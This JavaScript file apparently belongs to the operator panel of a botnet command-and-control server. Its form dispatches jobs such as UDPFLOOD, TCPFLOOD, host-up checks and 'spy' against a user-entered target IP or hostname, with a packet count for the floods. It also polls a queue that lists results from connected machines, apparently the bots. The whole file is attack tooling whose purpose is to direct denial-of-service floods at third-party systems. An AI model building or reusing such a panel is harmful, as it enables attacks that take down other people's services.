function equation() {
	document.getElementById("equation").onclick = function() {
		//alert("Fields updated!");
		document.getElementById("count").disabled = true;
		document.getElementById("count").style.display = "none";
		document.getElementById("submit").style.display = "block";
		document.getElementById("target").style.display = "block";
		document.getElementById("target").setAttribute("placeholder", "Input fields go here (ex: 9+10)");
	}
}

function udp() {
	document.getElementById("udp").onclick = function() {
		//alert("Fields updated!");
		document.getElementById("count").disabled = false;
		document.getElementById("count").style.display = "block";
		document.getElementById("submit").style.display = "block";
		document.getElementById("target").style.display = "block";
		document.getElementById("target").setAttribute("placeholder", "Input fields go here (ex: 23.34.217.101)");
	}

}

function tcp() {
	document.getElementById("tcp").onclick = function() {
		//alert("Fields updated!");
		document.getElementById("count").disabled = false;
		document.getElementById("count").style.display = "block";
		document.getElementById("submit").style.display = "block";
		document.getElementById("target").style.display = "block";
		document.getElementById("target").setAttribute("placeholder", "Input fields go here (ex: 23.34.217.101)");
	}
}

function hostup() {
	document.getElementById("hostup").onclick = function() {
		//alert("Fields updated!");
		document.getElementById("count").disabled = true;
		document.getElementById("count").style.display = "none";
		document.getElementById("submit").style.display = "block";
		document.getElementById("target").style.display = "block";
		document.getElementById("target").setAttribute("placeholder", "Input fields go here (ex: www.dominos.ca)");
	}
}

function spy() {
	document.getElementById("spy").onclick = function() {
		//alert("Fields updated!");
		document.getElementById("count").disabled = true;
		document.getElementById("count").style.display = "none";
		document.getElementById("target").style.display = "block";
		document.getElementById("submit").style.display = "block";
		document.getElementById("target").setAttribute("placeholder", "Spy");
	}
}

equation();
udp();
tcp();
hostup();
spy();

// this is the id of the form
$("#fieldform").submit(function(e) {

    e.preventDefault(); // avoid to execute the actual submit of the form.

    var form = $(this);
    var url = form.attr('action');
    
	var jobVal = $("input[name=switch-one]:checked").val();
	
	x = document.getElementById("target")
	var formattedData = "JOB " + jobVal + " " + x.value
	if(jobVal === "UDPFLOOD" || jobVal === "TCPFLOOD"){
	  	formattedData += document.getElementById("count").value
	} 
	
	var dataJson = {
	  	"job": formattedData, 
	}
	dataJson = encodeURIComponent(JSON.stringify(dataJson))
	console.log(dataJson);
	
	$.ajax ({
	  	type: "POST",
	  	url: url,
	  	data: dataJson,
		success: function(data) {
			console.log(data)
	  		//alert(data);
		}
	});
});

var clicked;
function addConnection(data) {
	var d = JSON.parse(data);
	var s = "";
	Object.keys(d['queue']).forEach(ip=> {
		s += `<button type="button" class="collapsible">${ip}</button>
<div class="content" id="${ip}">
	<p>Job Results:</p>`;
		d['queue'][ip].forEach(res => {
			s += `<p>${res}</p>`
		});
		s += `</div>`
	});
	if (s){
		document.getElementById("connect").innerHTML = s;
	}
}

/*
function collapsibleContent() {
	//just for collapsable content
	var coll = document.getElementsByClassName("collapsible");
	var i;
	for (i = 0; i < coll.length; i++) {
		this.classList.toggle("active");
		var content = this.nextElementSibling;
		if (content.style.maxHeight){
			content.style.maxHeight = null;
		} else {
			content.style.maxHeight = content.scrollHeight + "px";
		} 
	}
}
*/

//queue
$.get( "/api/queue", function( data ) {
	console.log(data);
	addConnection(data);
});
setInterval(function(){
	$.get( "/api/queue", function( data ) {
		console.log(data);
		addConnection(data);
		//collapsibleContent();
	});
}, 5000);

//Job result
/*
setInterval(function(){
	$.get( "/api/jobResult", function( data ) {
		var txt = data;
		var obj = JSON.parse(txt);

		//alert(obj.result);
	});	
}, 2000);
*/

